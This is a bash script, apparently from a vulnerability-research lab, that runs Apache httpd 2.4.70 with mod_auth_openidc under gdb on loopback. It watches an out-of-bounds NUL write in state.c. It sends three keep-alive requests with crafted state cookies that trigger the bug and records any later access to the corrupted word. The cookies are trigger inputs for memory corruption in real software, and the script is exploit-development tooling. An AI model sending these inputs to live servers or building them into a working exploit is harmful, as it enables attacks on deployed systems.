#!/usr/bin/env bash
# Same-connection consumer check after the live OOB NUL store.
# Break at pinned state.c:219, arm a hardware watchpoint on the corrupted word,
# then send three requests on the SAME TCP connection: no new accept can clear
# the word. A watchpoint hit would show a consumer read/write; none is expected.
# Loopback only; plain httpd 2.4.70, child under gdb -X.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
HTTPD=/home/mesh-home/mishe-tauftauf2shell/lab/frontier/apache2shell/build/httpd-2.4.70-install/bin/httpd
SRC="$HERE/src/mod_auth_openidc-plain/src/state.c"
OUT="$HERE/evidence/plain-oob/keepalive"
export LD_LIBRARY_PATH="$HERE/plain-prefix/lib"
mkdir -p "$OUT"
"$HTTPD" -f "$HERE/httpd-plain.conf" -k stop >/dev/null 2>&1
rm -f "$HERE/httpd-plain.pid"
sleep 1
timeout 70 gdb -q -batch \
  -ex 'set pagination off' -ex 'set breakpoint pending on' \
  -ex "break $SRC:219" \
  -ex "run -f $HERE/httpd-plain.conf -X" \
  -ex 'set $store = cookie' \
  -ex 'printf "STORE=%p WORD=%p\n", $store, *(unsigned long *)$store' \
  -ex 'next' \
  -ex 'printf "AFTER=%p\n", *(unsigned long *)$store' \
  -ex 'watch -l *(unsigned long *)$store' \
  -ex 'delete 1' \
  -ex 'continue' \
  -ex 'printf "WATCH PC=%s\n", $pc' \
  -ex 'bt 8' \
  --args "$HTTPD" >"$OUT/gdb.txt" 2>&1 &
gp=$!
sleep 8
python3 >"$OUT/client.txt" 2>&1 <<'PY'
import socket, time
s = socket.create_connection(("127.0.0.1", 18090), timeout=15)
def req(cookie):
    q = (b"GET /protected HTTP/1.1\r\nHost: 127.0.0.1:18090\r\nConnection: keep-alive\r\n"
         b"User-Agent: curl/8.5.0\r\nAccept: */*\r\nCookie: " + cookie + b"\r\n\r\n")
    s.sendall(q)
    s.settimeout(12)
    data = b""
    try:
        while b"\r\n\r\n" not in data:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
    except Exception as exc:
        print("recv error", repr(exc))
    print(cookie.decode(), data.split(b"\r\n", 1)[0].decode(errors="replace"), flush=True)
time.sleep(1)
req(b"mod_auth_openidc_state_novalue")
time.sleep(1)
req(b"mod_auth_openidc_state_good=1")
time.sleep(1)
req(b"mod_auth_openidc_state_novalue2=x")
s.close()
PY
wait "$gp"
"$HTTPD" -f "$HERE/httpd-plain.conf" -k stop >/dev/null 2>&1
echo "client:"; cat "$OUT/client.txt"
echo "gdb watch events:"; strings "$OUT/gdb.txt" | grep -E 'STORE=|AFTER=|Hardware watchpoint|Old value|New value|WATCH PC|^#' | head -40
